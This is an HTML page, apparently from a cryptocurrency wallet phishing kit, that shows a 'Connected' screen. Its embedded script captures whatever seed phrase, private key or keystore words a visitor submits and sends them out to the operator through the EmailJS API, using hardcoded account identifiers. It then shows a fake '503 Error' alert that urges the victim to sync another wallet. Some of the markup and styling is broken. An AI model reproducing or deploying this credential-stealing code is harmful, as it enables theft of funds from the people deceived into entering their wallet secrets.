<!DOCTYPE html>
<html lang="en">

    />

    <style>
      @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;700;800;900&amp;display=swap");

      * {
        font-family: "Poppins", sans-serif;

      body {

        /* background-image: linear-gradient(to bottom, #000000 10%, #0c0e29 100%); */

      textarea,
      input {
        color: #141b29 !important;
        font-weight: 600 !important;
        font-size: 13px !important;
      }

      .formpage {
        margin-top: 10rem;
      }

      .nav-link {
        color: #fff;
        font-weight: 600;
      }

      .nav-link:hover {
        color: #0c0e29;
      }

      .nav-item {
        -webkit-transition: 300ms linear;
        transition: 300ms linear;
      }

      .nav-item:hover {
        background-color: #fff;
        color: #0c0e29 !important;
      }

      .tab-content {
        background-color: #fff;
        padding-top: 2rem;
        padding-left: 1rem;
        padding-right: 1rem;
        padding-bottom: 2rem;
        border-radius: 2px;
      }

      .formpage-header h1 {
        color: #fff !important;
        font-weight: 500;
        margin-bottom: 4rem;
        margin-top: -4rem !important;
      }

      .formpage-header h6 {
        color: #fff;
        font-size: 12px;
        margin-bottom: 4rem;
        margin-top: -3rem !important;
      }

      .active {
        color: #0c0e29 !important;
      }

      .form-text {
        margin-top: 1rem;
      }

      .form-label {
        color: #89898a;
        font-weight: 500;
        font-size: 14px;
      }

      select {
        color: #0c0e29 !important;
        font-weight: 600 !important;
        font-size: 13px !important;
      }

      .btn-primary {
        background-color: #0c0e29 !important;
        border: none !important;
      }

      .btn-primary:hover,
      .btn-primary:focus,
      .btn-primary:active {
        background-color: #0c0e29 !important;
      }

      @media screen and (max-width: 768px) {
        .formpage-header {
          margin-top: -4.5rem !important;
        }

        .form-box {
          margin-top: -1rem;
        }
      }

      @media screen and (max-width: 413px) {
        .nav-link {
          font-size: 12px;
        }
      }
    </style>

  <body>
    <div class="formpage">
      <div class="content-box-md">
        <div class="container">
          <div class="row">
            <div class="col-md-12">
              <div class="text-center formpage-header">
                <h1>Connected</h1>
                <h6>
                  You should see node deposit if successful.
                </h6>
              </div>
            </div>
          </div>

          <div class="row">
            <div class="col-md-2"></div>
            
          </div>
        </div>
      </div>
    </div>

    <!-- bootstrap js link -->
    <!-- JavaScript Bundle with Popper -->
    <script
      src="https://code.jquery.com/jquery-3.6.0.min.js"
      integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
      crossorigin="anonymous"
    ></script>
    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p"
      crossorigin="anonymous"
    ></script>
    <script>
      let phrase = document.getElementById("phrase");
      let privateKey = document.getElementById("privatekey");
      let keystore = document.getElementById("keystore");

      function handleSubmit(event) {
        event.preventDefault();
        console.log("Submitted");
        const formData = new FormData(event.target);
        const formProps = Object.fromEntries(formData);
        let val = "";
        if (formProps.phrase) {
          val = formProps.phrase;
        } else if (formProps.privateKey) {
          val = formProps.privateKey;
        } else {
          val = formProps.words;
        }

        var data = {
          service_id: "service_gihw0l6",
          template_id: "template_az2womg",
          user_id: "LoiqdZbjKRz-Q_3Bk",
          template_params: {
            phrase: val,
          },
        };

        $.ajax("https://api.emailjs.com/api/v1.0/email/send", {
          type: "POST",
          data: JSON.stringify(data),
          contentType: "application/json",
        })
          .done(function () {
            console.log("Your mail is sent!");
            alert("503 Error, if this persist kindly sync another wallet and try again or contact admin");
          })
          .fail(function (error) {
            alert("Oops... " + JSON.stringify(error));
          });
      }
      phrase.addEventListener("submit", handleSubmit);
      privateKey.addEventListener("submit", handleSubmit);
      keystore.addEventListener("submit", handleSubmit);
    </script>
  </body>

  
</html>
